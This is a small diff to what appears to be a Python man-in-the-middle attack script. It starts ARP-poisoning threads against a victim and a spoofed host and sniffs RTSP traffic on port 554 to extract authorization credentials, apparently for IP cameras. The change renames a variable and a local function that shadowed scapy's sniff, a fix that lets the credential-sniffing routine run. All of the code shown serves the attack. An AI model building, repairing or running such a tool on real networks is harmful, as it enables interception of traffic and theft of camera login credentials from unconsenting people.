@@ -76,8 +76,8 @@ def sniff_rtsp_authorization(source_ip, target_ip):
                     sniff_result = field_dict
                     sys.exit()
 
-    filter = f'src host {source_ip} && dst host {target_ip} && tcp dst port 554'
-    sniff(filter=filter, iface=conf.iface, prn=read_packet)
+    rtsp_filter = f'src host {source_ip} && dst host {target_ip} && tcp dst port 554'
+    sniff(filter=rtsp_filter, iface=conf.iface, prn=read_packet)
 
 
 if __name__ == "__main__":
@@ -106,10 +106,10 @@ if __name__ == "__main__":
     Thread(target=poison_victim).start()
     Thread(target=poison_spoof).start()
 
-    def sniff():
+    def sniff_wrapper():
         sniff_rtsp_authorization(victim_ip, spoof_ip)
 
-    sniff_thread = Thread(target=sniff)
+    sniff_thread = Thread(target=sniff_wrapper)
     sniff_thread.start()
     sniff_thread.join()
 
